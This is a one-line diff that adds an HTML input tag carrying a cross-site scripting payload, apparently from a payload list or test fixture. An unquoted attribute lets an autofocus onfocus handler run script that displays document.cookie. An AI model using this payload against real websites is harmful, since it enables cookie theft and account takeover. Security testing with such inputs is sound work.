@@ -1,0 +1,1 @@
+<input name="param1" value= onfocus=alert(document.cookie) autofocus>
